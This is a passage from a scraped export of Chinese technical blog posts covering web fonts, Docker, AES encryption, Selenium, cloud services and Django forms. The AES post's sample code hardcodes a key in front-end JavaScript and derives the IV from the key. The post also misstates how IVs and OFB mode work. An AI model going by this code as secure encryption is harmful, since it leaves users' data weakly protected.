Typekit 共同开发，提供 Google 和 Typekit 的字体加载功能。使用 Google 的字体网络不能自由访问，Typekit 的字体需要收费。\nwebfontloader提供 6 个回调方法：\n1 2 3 4 5 6 7 8 WebFontConfig = { loading: function() {}, // loading：在所有字体开始加载时触发 active: function() {}, // active：在所有字体已渲染时触发 inactive: function() {}, // inactive：字体预加载失败，无效字体或浏览器不支持加载 fontloading: function(familyName, fvd) {}, // fontloading：指定字体预加载 fontactive: function(familyName, fvd) {}, // fontactive：指定字体已渲染 fontinactive: function(familyName, fvd) {} //// fontinactive：指定字体预加载失败 }; 5.2 Web Font Loader 使用 官方提供的实例：\n1 2 3 4 5 6 7 8 \u0026lt;script src=\u0026#34;https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; WebFont.load({ google: { families: [\u0026#39;Droid Sans\u0026#39;, \u0026#39;Droid Serif\u0026#39;], } }); \u0026lt;/script\u0026gt; 当然还有其他配置，timeout 超时，urls 自定义样式等。\n6. 参考 Webfontloader ","description":"","id":520,"section":"post","tags":["博文","前端","Demo"],"title":"页面使用自定义字体","uri":"https://www.chenshaowen.com/blog/page-uses-a-custom-font.html"},{"content":"1. 什么是Docker Docker诞生于2013年初，是dotCloud（ Docker.Inc前称）公司内部的一个业余项目，源代码托管在GitHub上，基于Go语言并遵从 Apache 2.0 开源协议。\nDocker 项目的目标是实现轻量级的操作系统虚拟化解决方案。 Docker 的基础是 Linux 容器（LXC）等技术。\nDocker 在 LXC 的基础上进行了进一步的封装，让用户不必关心容器的管理，可以轻松的为任何应用创建一个轻量级的、可移植的、自给自足的容器。\n2. 基本概念 镜像：容器运行时的只读模板，每一个镜像由一系列的层组成 仓库：用于保存镜像，可以理解为代码控制中的代码仓库 容器：包含了所有的某个应用运行所需要的环境，每个容器都是从镜像创建，是独立的应用平台 Dockerfile：包含创建镜像所有命令的文本文件 Docker Registry：官方提供的工具，可以用于构建私有的镜像仓库 Docker Hub：官方提供的公有 Docker Registry 3. 应用场景 简化配置：运行环境和配置放在代码中部署，降低了硬件要求和应用环境之间的耦合度 代码流水线管理：代码从开发机到正式环境，中间环节需要很多环境，Docker可以提供一致性的环境 提高效率：可以利用Docker，让开发环境更加逼近正式环境 隔离应用：Docker可以让一台机器上运行的不同应用，彼此相互隔离 整合服务：Docker可以通过虚拟机，整合多个应用 调试能力：Docker提供了很多的工具，用于为容器设置检查点、比较容器差异等，辅助调试 多租户环境：使用Docker，可以为每个租户的应用层的多个实例创建隔离的环境 快速部署：Docker通过创建容器部署，将部署过程压缩到秒级 4. Docker 运行结构 Docker 使用客户端-服务器 (C/S) 架构模式，使用远程API来管理和创建Docker容器。Docker 容器通过 Docker 镜像来创建。\nC/S架构， Docker daemon 作为服务端接受来自客户的请求，并处理这些请求（创建、运行、分发容器）。 客户端和服务端既可以运行在一个机器上，也可通过 socket 或者RESTful API 来进行通信。 Docker daemon 一般在宿主主机后台运行，等待接收来自客户端的消息。 Docker 客户端则为用户提供一系列可执行命令，用户用这些命令实现跟 Docker daemon 交互。 5. Docker 核心架构 Docker Client：用户与Docker Daemon建立通信的终端 Docker Daemon Docker Server，服务于Docker API；Engine，执行引擎；Job，Engine内工作最小执行单元\n其中，Docker Server架构\ndriver execdriver，管理容器的运行；Networkdriver，管理容器的网络；Graphdriver，管理容器的镜像\n其中，execdriver：LXC，早版使用LXC作为创建管理容器的工具；Native，如今使用native来创建管理容器，native调用libcontainer\n其中，graphdriver\ngraph libcontainer Docker 从 0.9 版本开始使用 libcontainer 替代了lxc，libcontainer几乎囊括了docker的全部核心技术。\nnetworkdriver Docker网络模式 Docker Daemon网络模式：\nbridge桥接\nNone（disabled）\nDocker Container网络模式：\nbridge桥接模式\nHost模式\nother container模式\nNone（disabled）模式\n6. Docker 命令 基本语法\nDocker 命令有两大类，客户端命令和服务端命令。前者是主要的操作接口，后者用来启动 Docker daemon。\n客户端命令：基本命令格式为 docker [OPTIONS] COMMAND [arg\u0026hellip;] 服务端命令：基本命令格式为 docker daemon [OPTIONS] 可以通过 man docker 或 docker help 来查看这些命令。\n容器生命周期管理命令： run，start/stop/restart，kill，rm，pause/unpause，create，exec 容器操作命令：ps，inspect，top，attach，events，logs，wait，export，port 容器rootfs命令：commit，cp，diff 镜像仓库命令：login，pull，push，search 本地镜像管理命令：images，rmi，tag，build，history，save，import，- info|version命令：info，version 7. 安装 Docker Docker ToolBox(前往下载)包含了如下Docker工具：\nDocker Machine：包含了docker-machine命令 运行Docker命令所需要的引擎 Docker Compose：容器管理工具 Kitematic：Docker GUI界面 Oracle公司的VM VirtualBox 除此，还提供了一些 Docker 命令行Shell。\n需要说明的是，在Windows环境下：\n由于Docker守候进程依赖于Linux内核，无法直接在Windows环境中运行。需要使用docker-machine命令，创建一个Docker虚拟机，通过虚拟机提供Docker服务。\n这里使用Docker ToolBox提供的GUI管理工具，创建一个本地的Nginx服务：\n下载镜像，创建容器。在Kitematic的UI界面可以一键创建容器，下图红色箭头所指： 访问服务。下图红色箭头所指，可以直接访问到服务。 在Home旁边的Settings标签下，包含容器相关的参数，配置项（host，port，network等）。\n8. Kubernetes 简介：Kubernetes(k8s)是Google开源的容器集群管理系统。在Docker技术的基础上，为容器化的应用提供部署运行、资源调度、服务发现和动态伸缩等一系列完整功能，提高了大规模容器集群管理的便捷性。 优势：容器编排，轻量级，开源，弹性伸缩，负载均衡 9. 参考 1.https://www.kancloud.cn/thinkphp/docker_practice/30894 ","description":"","id":521,"section":"post","tags":["PaaS","DevOps","Docker","整理"],"title":"Docker 基础","uri":"https://www.chenshaowen.com/blog/basis-of-docker.html"},{"content":"1.基本概念 对称加密：\n对称加密是，采用单密钥密码系统的加密方法，同一个密钥同时用作信息的加密和解密。由于速度快，常用于加密大量数据的传输。 DES（Data Encryption Standard），数据加密标准：\nDES的密钥长度是56比特，算法的理论安全强度是\\( 2^{56} \\)。随着计算机处理能力的增强，DES已经不能够提供足够的安全性。 AES（Advanced Encryption Standard），高级加密标准：\n1997年1月，美国国家标准技术研究所，开始征集高级加密标准，得到众多学者响应。经过层层筛选、性能测试，最后Rijndael算法被选中。该算法为比利时密码学家Joan Daemen和Vincent Rijmen所设计。 2.基本原理 下面是加密过程的动态图。\nAES加密算法涉及4种操作。\n1.字节替代（SubBytes）:\n字节代替的主要功能是完成一个字节到另外一个字节的映射 2.行移位（ShiftRows）:\n行移位是一个4x4的矩阵内部字节之间的置换，用于提供算法的扩散性。 3.列混淆（MixColumns）:\n列混淆，利用GF(\\( 2^{8} \\))域上算术特性的一个代替，同样用于提供算法的扩散性。 4.轮密钥加（AddRoundKey）:\n矩阵中的每一个字节都与该次轮秘钥（round key）做XOR运算，每个子密钥由密钥生成方案产生。 下面是AES加密算法图解：\n3.工作模式 分组加密算法是按分组大小来进行加解密操作的，如DES算法的分组是64位，而AES是128位，但实际明文的长度一般要远大于分组大小，这样的情况如何处理呢？\n工作模式约定的就是明文数据流按照多大分组切分、数据对不齐时如何处理等问题。\n主要的几种工作模式：\n电子密码本（Electronic Code Book Mode ，ECB）:\nECB模式只是将明文按分组大小切分，然后用同样的密钥正常加密切分好的明文分组。ECB的理想应用场景是短数据（如加密密钥）的加密。此模式的问题是无法隐藏原明文数据的模式，因为同样的明文分组加密得到的密文也是一样的。 密码分组链接（Cipher Block Chaining Mode ，CBC）:引入了IV（初始化向量：Initialization Vector）的概念。CBC模式相比ECB实现了更好的模式隐藏，但因为其将密文引入运算，加解密操作无法并行操作。同时引入的IV向量，还需要加、解密双方共同知晓方可。 密文反馈（Cipher Feedback Mode ，CFB）:与CBC模式类似，但不同的地方在于，CFB模式先生成密码流字典，然后用密码字典与明文进行异或操作并最终生成密文。后一分组的密码字典的生成需要前一分组的密文参与运算。 输出反馈（Output Feedback Mode ，OFB）:OFB模式与CFB模式不同的地方是：生成字典的时候会采用明文参与运算，CFB采用的是密文。 计数器模式（Counter Mode ，CTR）:CTR模式同样会产生流密码字典，但同是会引入一个计数，以保证任意长时间均不会产生重复输出。 4. 填充 填充的作用是，在加密前将普通文本的长度扩展到需要的长度。ECB 和 CBC 需要填充，即加密后长度可能会不一样，CFB\n、OFB、CTR 不需要填充，密文长度与明文长度一样。主要的填充模式有，PKCS7 、ANSIX923、ISO10126 、NoPadding、ZeroPadding。\nPKCS7 ： 填充字符串由一个字节序列组成，每个字节填充该字节序列的长度 ANSIX923：填充字符串包含的一个填充了零长度的字节序列 ISO10126 ：填充字符串包含的长度的随机数据 NoPadding：不填充是完成的 ZeroPadding：填充字符串由设置为零的字节组成 示例：\n数据︰ FF FF FF FF FF FF FF FF FF PKCS7 填充︰ FF FF FF FF FF FF FF FF FF 07 07 07 07-07-07 07 ANSIX923填充︰ FF FF FF FF FF FF FF FF FF 00 00 00 00 00 00 07 ISO10126 填充︰ FF FF FF FF FF FF FF FF FF 7 D 2A 75 EF F8 EF 07 ZeroPadding 填充︰ FF FF FF FF FF FF FF FF FF 00 00 00 00 00 00 00 5. 前端AES加密 - JavaScript 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 \u0026lt;script src=\u0026#34;cryptojs/3.1.2/rollups/aes.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;cryptojs/3.1.2/components/pad-zeropadding-min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; var str = \u0026#39;my_text\u0026#39;; // 密钥key长度必须为16（AES-128）、24（AES-192）、或32（AES-256）Bytes 长度 var key = \u0026#39;mDSR16qzlugnyK0wBJZOAhTHoI4sP7df\u0026#39;; // 初始向量 initial vector 16 位，这里为了简便，直接截取key前16位 var iv = key.substring(0,16) ; // key 和 iv 可以一致 key = CryptoJS.enc.Utf8.parse(key); iv = CryptoJS.enc.Utf8.parse(iv); //加密过程 var encrypted = CryptoJS.AES.encrypt(str, key, { iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.ZeroPadding }); // mode 支持 CBC、CFB、CTR、ECB、OFB, 默认 CBC // padding 支持 Pkcs7、AnsiX923、Iso10126、NoPadding、ZeroPadding, 默认 Pkcs7 // 转换为字符串，\u0026#34;7sLMd96Msn24voJuuLDllw==\u0026#34; encrypted = encrypted.toString(); //解密过程 var decrypted = CryptoJS.AES.decrypt(encrypted, key, { iv: iv, mode: CryptoJS.mode.CBC, padding: CryptoJS.pad.ZeroPadding }); // 转换为 utf8 字符串，\u0026#34;my_text\u0026#34; decrypted = CryptoJS.enc.Utf8.stringify(decrypted); \u0026lt;/script\u0026gt; 6. 后端AES加密- Python 安装PyCrypto库 在Python中使用AES加密，只需要安装一个PyCrypto库即可。\n1 pip install pycrypto 生成Key AES的Key可选长度必须是，16个字节，24个字节，32个字节。\n1 2 import random, string key = \u0026#39;\u0026#39;.join(random.sample(string.ascii_letters + string.digits, 16)) AES加密函数原型 1 2 from Crypto.Cipher import AES cipher = AES.new(key, mode, iv) key：初始密钥。根据 AES 规范，可以是 16 字节、24 字节和32 字节长，分别对应 128 位、192 位和 256 位 mode：加密模式。可以寻找相关的文档了解。接下来的示例中会用到 CBC 模式，因此在此作一个简单的阐述：CBC 模式是先将明文切分成若干小段，然后每一小段与初始块或者上一段的密文段进行异或运算后，再与密钥进行加密 iv：初始化向量。在部分加密模式中需要使用到，如对于 CBC 模式来说，它必须是随机选取并且需要保密的；而且它的长度和密码分组相同（AES 的分组长度固定为 16 字节） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 # encoding:utf-8 import string import base64 import random from Crypto.Cipher import AES class AESecrypt(): def __init__(self, key, padding=\u0026#39;\\0\u0026#39;): # 这里密钥key 长度必须为16（AES-128）、24（AES-192）、或32（AES-256）Bytes 长度 self.key = key self.iv = key[:AES.block_size] self.mode = AES.MODE_CBC self.padding = padding # self.is_unicode = False # 加密函数，如果text不是16的倍数【加密文本text必须为16的倍数！】，那就补足为16的倍数 def encrypt(self, text): # if isinstance(text, unicode): # text = text.encode(\u0026#39;utf-8\u0026#39;) # self.is_unicode = True cryptor = AES.new(self.key, self.mode, IV=self.iv) length = AES.block_size count = len(text) add = count % length if add: text = text + (self.padding * (length - add)) self.ciphertext = cryptor.encrypt(text) # 因为AES加密时候得到的字符串不一定是ascii字符集的，输出到终端或者保存时候可能存在问题 # 所以这里统一把加密后的字符串用base64转化 return base64.b64encode(self.ciphertext) # 解密后，去掉补足的\u0026#39;\\0\u0026#39;用strip() 去掉 def decrypt(self, text): cryptor = AES.new(self.key, self.mode, IV=self.iv) plain_text = cryptor.decrypt(base64.b64decode(text)).rstrip(self.padding) # return plain_text.decode(\u0026#39;utf-8\u0026#39;) if self.is_unicode else plain_text return plain_text if __name__ == \u0026#39;__main__\u0026#39;: key = \u0026#39;\u0026#39;.join(random.sample(string.ascii_letters + string.digits, 32)) print \u0026#39;key:{key}, length:{length}\u0026#39;.format(key=key, length=len(key)) tool = AESecrypt(key) e_text_en = tool.encrypt(\u0026#39;my_text\u0026#39;) print u\u0026#39;encrypt_text_en:{text}\u0026#39;.format(text=e_text_en) d_text_en = tool.decrypt(e_text_en) print \u0026#39;de_text_en:{text}\u0026#39;.format(text=d_text_en) # e_text_cn = tool.encrypt(u\u0026#39;中文文本\u0026#39;) # print \u0026#39;encrypt_text_cn:{text}\u0026#39;.format(text=e_text_cn) # d_text_cn = tool.decrypt(e_text_cn) # print u\u0026#39;de_text_en:{text}\u0026#39;.format(text=d_text_cn) 输出：\n1 2 3 key:8YkSbojRzx3AJfuX2QdD6s5HWFcL1iE4, length:32 encrypt_text_en:YZ5PUFJIqYeSDbD8ORq5Qg== de_text_en:my_text 7. 参考 https://github.com/matt-wu/AES ","description":"","id":522,"section":"post","tags":["博文","安全","前端","后端"],"title":"前后端对称加密传输 - AES","uri":"https://www.chenshaowen.com/blog/symmetric-encrypted-transmission-of-aes.html"},{"content":"\n","description":"","id":523,"section":"post","tags":["转载","研究报告","方法"],"title":"一天，让你的报告高大上","uri":"https://www.chenshaowen.com/blog/one-day-make-report-great.html"},{"content":"1. 方法篇 2. 实战篇 ","description":"","id":524,"section":"post","tags":["转载","研究报告","方法"],"title":"如何快速了解一个行业","uri":"https://www.chenshaowen.com/blog/how-to-quickly-understand-an-industry.html"},{"content":"1. Selenium 简介 Selenium 是一个 Thoughtworks 公司的集成测试工具。Selenium 的核心 Selenium Core 基于\nJSUnit，完全由 JavaScript 编写，可以运行于任何支持 JavaScript 的浏览器上。\n1.1 主要功能和特点 开源、免费。 多浏览器支持：Firefox、Chrome、IE、Opera，可以用于兼容性测试。 多平台支持：Linux、Windows、Mac OS。 多语言支持：Java、Python、Ruby、PHP、C#、JavaScript。 支持录制用例：自动生成测试脚本，用于回归功能测试。 支持分布式测试用例执行。 1.2 组成部分 Selenium IDE Selenium IDE 是 Firefox 浏览器的一个插件，用于录制和回放 Selenium 测试脚本。\nWebDriver、RC WebDriver、RC 提供了各种编程语言 API 的支持，例如 Java、Python、Ruby、PHP、.NET 等，能够与不同的浏览器进行交互，驱动浏览器进行自动化测试。\nGrid Grid 提供了分布式测试和并行测试的能力，能够大幅地减少测试的执行时间。\nSelenium 2.0 集成了 RC、Webdriver 来提供 Web UI 级自动化测试能力。\nSelenium 3.0 新增了对 Edge 和 Safari 的原生驱动支持。\n2. 原理介绍 WebDriver 是按照 Server–Client 的模式设计的。\nServer 端就是 Remote Server，可以是任意的浏览器。使用脚本启动浏览器后，这个浏览器就是 Remote Server，它的职责就是等待 Client 发送请求，并做出相应。\nClient 端就是 Test Script 测试代码。在测试代码中定义一些行为，比如打开浏览器，转跳到特定的 URL 等操作。这些操作是以 HTTP 请求的方式发送给 Remote Server（也就是被测试的浏览器）。Remote Server 接受请求，并执行相应操作，并在 Response 中返回执行状态、返回值等信息。\nWebdriver的工作原理：\n启动浏览器后，Selenium-Webdriver 会将目标浏览器绑定到特定的端口，启动后的浏览器则作为Webdriver 的 Remote Server。\nClient端 (也就是测试脚本)，借助 ComandExecutor 发送 HTTP 请求 Json 数据给 Sever 端。告诉 Selenium ，Client 端希望浏览器做什么。Sever 端需要依赖原生的浏览器组件，转化 Web Service 的命令为浏览器 Native 的调用来完成操作。\n3. 用 Selenium IDE 录制和导出脚本 Selenium IDE 是 Firefox 浏览器的一个插件，用于记录用户对 Firefox 的操作，并且可以回放用户的操作。\n3.1 安装 Selenium IDE 下载安装 Firefox，在浏览器中打开，https://addons.mozilla.org/en-US/firefox/addon/selenium-ide/，安装 selenium-ide。\n需要提醒的是，selenium-ide 并不支持全部版本的 Firefox。如果打开 Firefox 工具栏的 【工具】- 【Selenium IDE】，提示报错，很有可能是版本不兼容问题。这时，需要在 selenium-ide 的安装页面，找到其支持的 Firefox 版本，安装兼容的 Firefox 版本即可。\n3.2 基本构成 每个脚本都是由若干条 Action （行为）组成，而每个 Action 又由 Command，Target，Value 三者组成。\nCommand，命令\n有几类的命令：Action动作，包含 click、open、type 等、 Assertion 断言、Element Locators 指定元素、 Patterns 模式匹配 Target\nWeb 中的某个对象，比如：文字，输入框等 Value\n使用 Xpath 指定某个对象 3.3 录制脚本 打开 Firefox， 在工具栏找到 【工具】-【Selenium IDE】，点击打开，默认开始录制脚本。\n录制完毕后，点击录制停止按钮。在左侧的执行命令面板中，可以选择连接执行命令或者单步执行命令。\n3.4 导出 Python 脚本 导出 Python 脚本之后，默认是使用的 Firefox()浏览器进行测试，这里修改为 Chrome()。需要安装 chromedriver 才能执行脚本。\n导出的脚本内容如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 # -*- coding: utf-8 -*- from selenium import webdriver from selenium.webdriver.common.by import By from selenium.webdriver.common.keys import Keys from selenium.webdriver.support.ui import Select from selenium.common.exceptions import NoSuchElementException from selenium.common.exceptions import NoAlertPresentException import unittest, time, re class T(unittest.TestCase): def setUp(self): self.driver = webdriver.Chrome() self.driver.implicitly_wait(30) self.base_url = \u0026#34;https://www.baidu.com/\u0026#34; self.verificationErrors = [] self.accept_next_alert = True def test_t(self): driver = self.driver driver.get(self.base_url + \u0026#34;/?tn=98012088_5_dg\u0026amp;ch=12\u0026#34;) driver.find_element_by_id(\u0026#34;kw\u0026#34;).click() driver.find_element_by_id(\u0026#34;kw\u0026#34;).clear() driver.find_element_by_id(\u0026#34;kw\u0026#34;).send_keys(\u0026#34;selenium\u0026#34;) driver.find_element_by_id(\u0026#34;su\u0026#34;).click() driver.find_element_by_link_text(\u0026#34;Selenium - Web Browser Automation\u0026#34;).click() def is_element_present(self, how, what): try: self.driver.find_element(by=how, value=what) except NoSuchElementException as e: return False return True def is_alert_present(self): try: self.driver.switch_to_alert() except NoAlertPresentException as e: return False return True def close_alert_and_get_its_text(self): try: alert = self.driver.switch_to_alert() alert_text = alert.text if self.accept_next_alert: alert.accept() else: alert.dismiss() return alert_text finally: self.accept_next_alert = True def tearDown(self): self.driver.quit() self.assertEqual([], self.verificationErrors) if __name__ == \u0026#34;__main__\u0026#34;: unittest.main() 4. Selenium + Python 自动测试 4.1 安装 Selenium 1 pip install Selenium 4.2 编写测试脚本 test.py\n1 2 3 4 5 6 7 #coding=utf-8 from selenium import webdriver driver = webdriver.Firefox() driver.get(\u0026#34;http://www.baidu.com\u0026#34;) driver.find_element_by_id(\u0026#34;kw\u0026#34;).send_keys(\u0026#34;Selenium2\u0026#34;) driver.find_element_by_id(\u0026#34;su\u0026#34;).click() driver.quit() 4.3 执行测试 1 python test.py 如果报错，提示：\n1 2 3 File \u0026#34;C:\\python\\lib\\site-packages\\selenium\\webdriver\\common\\service.py\u0026#34;, line 81, in start os.path.basename(self.path), self.start_error_message) selenium.common.exceptions.WebDriverException: Message: \u0026#39;geckodriver\u0026#39; executable needs to be in PATH. 那么需要下载geckodriver ，并将其存放路径，加入系统的环境变量 PATH 中。\n如果希望支持 IE、Chrome 需要下载相应的驱动，http://www.seleniumhq.org/download/ 下载IEDriverServer、chromedriver，并将其存放路径，加入系统的环境变量 PATH 中。\n1 2 3 4 5 # 将 driver = webdriver.Firefox() 替换为 driver = webdriver.Chrome() # 或者 driver = webdriver.Ie() # 即可支持相应的浏览器 5. 参考 https://www.ibm.com/developerworks/cn/web/1209_caimin_seleniumweb/ https://www.ibm.com/developerworks/cn/web/1303_luoxs_webdrivertvt/index.html ","description":"","id":525,"section":"post","tags":["博文","工具","测试"],"title":"自动化测试工具 - Selenium","uri":"https://www.chenshaowen.com/blog/automated-testing-tool-about-selenium.html"},{"content":"1. 云服务的分类 IaaS，提供计算和存储服务。 PaaS，提供软件运行的平台环境服务。 SaaS，直接提供软件服务。 2. 云服务的应用场景 采用云服务可以显著减少 IT 支出。\n在 IaaS 服务中，云主机、存储是用户采用率最高的服务产品，其次是数据库、网络加速。 IaaS 是当前企业主要采用的云服务模式。 在 PaaS 服务中，大数据分析是用户采用率最高的服务产品，其次是安全监控、Web 建站、应用开发。 在 SaaS 服务中，企业通讯软件服务最受欢迎，包括云邮箱、统一通信平台，其次是 ERP、CRM 等企业管理软件。 3. 云服务的市场 IaaS：巨头林立，创业空间狭小。IaaS 已经发展到相对成熟的阶段，国外有亚马逊、微软，国内有腾讯、阿里。IaaS 服务同质化比较严重，利润率不高，竞争十分激烈。 PaaS：BAT 垄断，细分领域仍有机可乘。 SaaS：不可错过的千亿级蓝海市场。国内目前没有形成 SaaS 服务巨头，硬件设施、网络条件、安全性制约着国内 SaaS 的发展。随着技术的发展，上述问题会逐步得到解决。随着，中小企业从粗放式管理向精细化管理的转型、销售渠道的网络化，企业级别 4. 云服务的部署模式 主要有四种部署模式，公有云、社区云、私有云、混合云。\n公有云：基础设施由第三方提供，比如阿里云、腾讯云等。通过 Internet 连接使用，价格低廉，共享服务资源。 社区云：基础设施被一些组织共享，并为一个共同关注点的社区服务。 私有云：基础设施独占使用，提供对数据、安全性和服务质量的有效控制。私有云可以部署在企业数据中心，也可以托管在某个机房。 混合云：混合云是私有云和公有云的混合。混合云综合了数据安全性以及数据共享双重方面的考虑，个性化的方案达到了省钱安全的目的。 5. PaaS 的优势 以一个电商 APP 举例，需要的功能大概涉及：用户模块（注册、登陆）、商品展示模块（商品信息、图片资源存储）、搜索（语音搜索、图片识别）、购买系统（支付）、广告系统（闪屏广告、banner广告）、客服系统（即时通讯、机器人客服）等。在 PaaS 服务普及之前，这些都需要找不同的程序员，每一项都需要人员手动写代码，耗费大量精力，也未必能完成。\n利用 PaaS ，只需要像采购员一样，挑选合适的服务，用于业务逻辑的组装，大大降低了开发成本、加快了开发进度。\n6. 技术趋势 混合云 混合云解决了数据安全与共享的矛盾。越来越多的中大型企业，将会采用混合云的模式部署自己的云服务。\nDevOps\n为了适应互联网快速迭代、快速发布的特点，采取运维开发一体化的开发模式是必须的。DevOps 融入了许多新的概念和技术，比如 CI/CD，Docker等。\nDocker\nDocker 极大消除了各种环境之间的差异，提供了一个统一的运行部署环境，极大便利了 DevOps 流程。\n数据挖掘 云服务具有较明显的规模效应。当具有一定规模时，沉淀的数据量也是巨大的。这时，数据挖掘，或者说 AI 将会成为竞争的核心技术。\n","description":"","id":526,"section":"post","tags":["研究报告","博文","PaaS","观点","云服务"],"title":"云服务行业观察 - 2017","uri":"https://www.chenshaowen.com/blog/cloud-industry-research-report-of-2017.html"},{"content":"1. 自动生成HTML表单元素 Widget，用来渲染成HTML元素的工具。\n指定小部件 1 2 3 4 5 6 from django import forms class CommentForm(forms.Form): name = forms.CharField() url = forms.URLField() comment = forms.CharField(widget=forms.Textarea) CommentForm().as_table() 输出值\n1 \u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;\u0026lt;label for=\u0026#34;id_name\u0026#34;\u0026gt;Name:\u0026lt;/label\u0026gt;\u0026lt;/th\u0026gt;\u0026lt;td\u0026gt;\u0026lt;input id=\u0026#34;id_name\u0026#34; name=\u0026#34;name\u0026#34; type=\u0026#34;text\u0026#34; /\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\\n\u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;\u0026lt;label for=\u0026#34;id_url\u0026#34;\u0026gt;Url:\u0026lt;/label\u0026gt;\u0026lt;/th\u0026gt;\u0026lt;td\u0026gt;\u0026lt;input id=\u0026#34;id_url\u0026#34; name=\u0026#34;url\u0026#34; type=\u0026#34;url\u0026#34; /\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\\n\u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;\u0026lt;label for=\u0026#34;id_comment\u0026#34;\u0026gt;Comment:\u0026lt;/label\u0026gt;\u0026lt;/th\u0026gt;\u0026lt;td\u0026gt;\u0026lt;textarea cols=\u0026#34;40\u0026#34; id=\u0026#34;id_comment\u0026#34; name=\u0026#34;comment\u0026#34; rows=\u0026#34;10\u0026#34;\u0026gt;\\r\\n\u0026lt;/textarea\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt; 指定表单字段为 Textarea 小部件，而不是默认的 TextInput 小部件。\n自定义小部件的样式 1 2 3 4 class CommentFormClass(forms.Form): name = forms.CharField(widget=forms.TextInput(attrs={\u0026#39;class\u0026#39;: \u0026#39;special\u0026#39;})) url = forms.URLField() comment = forms.CharField(widget=forms.TextInput(attrs={\u0026#39;size\u0026#39;: \u0026#39;40\u0026#39;})) CommentFormClass().as_table() 输出值\n1 \u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;\u0026lt;label for=\u0026#34;id_name\u0026#34;\u0026gt;Name:\u0026lt;/label\u0026gt;\u0026lt;/th\u0026gt;\u0026lt;td\u0026gt;\u0026lt;input class=\u0026#34;special\u0026#34; id=\u0026#34;id_name\u0026#34; name=\u0026#34;name\u0026#34; type=\u0026#34;text\u0026#34; /\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\\n\u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;\u0026lt;label for=\u0026#34;id_url\u0026#34;\u0026gt;Url:\u0026lt;/label\u0026gt;\u0026lt;/th\u0026gt;\u0026lt;td\u0026gt;\u0026lt;input id=\u0026#34;id_url\u0026#34; name=\u0026#34;url\u0026#34; type=\u0026#34;url\u0026#34; /\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\\n\u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;\u0026lt;label for=\u0026#34;id_comment\u0026#34;\u0026gt;Comment:\u0026lt;/label\u0026gt;\u0026lt;/th\u0026gt;\u0026lt;td\u0026gt;\u0026lt;input id=\u0026#34;id_comment\u0026#34; name=\u0026#34;comment\u0026#34; size=\u0026#34;40\u0026#34; type=\u0026#34;text\u0026#34; /\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt; 输出形式 通常我们在 views.py 函数中，实例化 Form ，然后传入模板。\n1 2 3 4 5 from django.shortcuts import render from .forms import CommentForm pass form = CommentForm() return render(request, \u0026#39;my_template.html\u0026#39;, {\u0026#39;form\u0026#39;: form}) 在模板中使用，my_template.html 。根据 {{ form }}，所有的表单字段和属性，将通过 Django 的模板语言拆分成 HTML 标记 。\n1 2 3 4 5 \u0026lt;form action=\u0026#34;/my_template_data/\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; {% csrf_token %} {{ form }} \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Submit\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; 可选的表单渲染项：\n{{ form.as_table }} 以表格的形式将它们渲染在tr标签中\n{{ form.as_p }} 将它们渲染在p 标签中\n{{ form.as_ul }} 将它们渲染在ul标签中\n2. 检查表单数据的合法性 为了能够快速、有效的校验提交的数据。Django Forms提供了对表单数据合法性校验的支持。\n校验流程\n继承 form.Form ，创建自定义 Form 类 MyForm 使用 request.POST，实例化 MyForm类 合法性校验，is_valid() 获取合法数据或返回错误提示 下面是一个简单的例子：\nforms.py\n1 2 3 from django import forms class Contact(forms.Form): email = forms.EmailField(error_messages={\u0026#39;required\u0026#39;:u\u0026#39;邮箱不能为空\u0026#39;}) views.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 from django.http import HttpResponse from .forms import Contact def my_view(request): form = Contact(request.POST) if not form.is_valid(): return HttpResponse( json.dumps({ \u0026#34;result\u0026#34;: False, \u0026#34;data\u0026#34;: [], \u0026#34;message\u0026#34;: form.errors, \u0026#34;code\u0026#34;: -1 }), content_type=\u0026#39;application/json\u0026#39;) else: return HttpResponse( json.dumps({ \u0026#34;result\u0026#34;: True, \u0026#34;data\u0026#34;: [], \u0026#34;message\u0026#34;: form.cleaned_data.get(\u0026#39;email\u0026#39;), \u0026#34;code\u0026#34;: -1 }), content_type=\u0026#39;application/json\u0026#39;) 如果接口从POST数据中，获取到了email字段，并且为邮箱字段，就返回True。否则，返回错误提示。\n2.1 继承 Form 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 import re from django import forms from django.core.validators import validate_email from django.core.exceptions import ValidationError class ContactForm(forms.Form): cn8_re = re.compile(ur\u0026#39;^[-_\\w\\u4e00-\\u9fa5]{3,16}$\u0026#39;) SEXUAL_CHOICES = ( (0, u\u0026#39;男\u0026#39;), (1, u\u0026#39;女\u0026#39;) ) # 正则校验 nick_name = 